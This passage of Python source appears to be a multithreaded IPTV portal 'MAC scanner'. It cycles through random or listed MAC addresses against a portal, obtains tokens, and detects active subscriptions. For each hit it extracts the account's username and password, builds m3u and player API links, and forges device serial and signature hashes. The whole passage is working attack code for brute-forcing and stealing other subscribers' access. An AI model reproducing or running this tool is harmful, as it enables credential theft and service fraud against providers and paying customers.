				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d15():
	global hitc
	global hitr
	global tokenr
	for mac in range(15,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_15"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

t1 = threading.Thread(target=d1)	
t2 = threading.Thread(target=d2)
t3= threading.Thread(target=d3)
t4= threading.Thread(target=d4)
t5= threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)




t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t2.start()
	
	
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t3.start()
	
	
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t4.start()
	
	
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t5.start()
	
	
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t6.start()
	
	
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t7.start()
	
	
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t8.start()
	
	
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t9.start()
	
	
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t10.start()
	
	
if  botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t11.start()
	

if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t12.start()
	
	
if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t13.start()
	

if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t14.start()
	

if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t15.start()
	

